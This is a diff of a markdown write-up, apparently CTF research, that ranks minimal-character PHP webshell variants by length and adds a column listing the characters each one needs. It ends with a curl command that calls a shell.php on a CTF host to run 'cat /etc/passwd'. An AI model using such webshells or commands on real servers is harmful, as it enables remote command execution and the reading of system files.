@@ -133,18 +133,18 @@ versions since the use of underscore as constant was then removed.
 
 ## Length Ranking
 
-| Rank | Version                     | Method | Length |
-|------|-----------------------------|--------|--------|
-| 1    | Underscore constant         | GET    | 58     |
-| 2    | Array into String           | GET    | 63     |
-| 3    | Infinite result into string | GET    | 65     |
-| 4    | Underscore constant         | POST   | 65     |
-| 5    | Array into String           | POST   | 68     |
-| 6    | Infinite result into string | POST   | 78     |
-| 7    | Char Increment              | GET    | 169    |
-| 8    | Char Increment              | POST   | 176    |
+| Rank | Version                     | Method | Length | Needed Chars           |
+|------|-----------------------------|--------|--------|------------------------|
+| 1    | Underscore constant         | GET    | 58     | <?=$_[].;(23^57)01     |
+| 2    | Array into String           | GET    | 63     | <?=$_[].1;3^-570()     |
+| 3    | Infinite result into string | GET    | 65     | <?=$_9*.1;80-^(\[4]+2) |
+| 4    | Underscore constant         | POST   | 65     | <?=$_[].;(34^1625)0    |
+| 5    | Array into String           | POST   | 68     | <?=$_[].1;34^-20()     |
+| 6    | Infinite result into string | POST   | 78     | <?=$_-9*.1;408^\[3]6() |
+| 7    | Char Increment              | GET    | 169    | <?=\[$_(].1)0,+957684; |
+| 8    | Char Increment              | POST   | 176    | <?=\[$_(].1)0,+958734; |
 
-To query the shells you can use the browser or this snippets:
+To query the shells you can use the browser or these snippets:
 
 ```bash
 curl https://host.ctf.com/shell.php?0=system&1=cat /etc/passwd
